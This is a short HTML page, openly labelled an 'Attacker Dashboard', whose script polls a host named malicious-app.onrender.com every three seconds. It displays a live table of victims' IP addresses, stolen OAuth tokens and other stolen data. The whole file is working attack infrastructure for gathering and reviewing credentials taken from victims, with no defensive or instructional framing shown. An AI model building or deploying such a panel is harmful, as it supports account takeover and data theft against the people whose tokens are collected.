<!DOCTYPE html>
<html>
<head>
    <title>Attacker Dashboard</title>
</head>
<body>
    <h1>Live Stolen Data</h1>
    <table border="1">
        <thead>
            <tr><th>Time</th><th>IP</th><th>OAuth Token</th><th>Stolen Data</th></tr>
        </thead>
        <tbody id="data-table"></tbody>
    </table>

    <script>
        async function fetchData() {
            let response = await fetch("https://malicious-app.onrender.com/data");
            let data = await response.json();
            let table = document.getElementById("data-table");
            table.innerHTML = "";
            data.forEach(item => {
                table.innerHTML += `<tr>
                    <td>${new Date().toLocaleTimeString()}</td>
                    <td>${item.ip}</td>
                    <td>${item.token}</td>
                    <td>${JSON.stringify(item.data)}</td>
                </tr>`;
            });
        }
        setInterval(fetchData, 3000);
    </script>
</body>
</html>
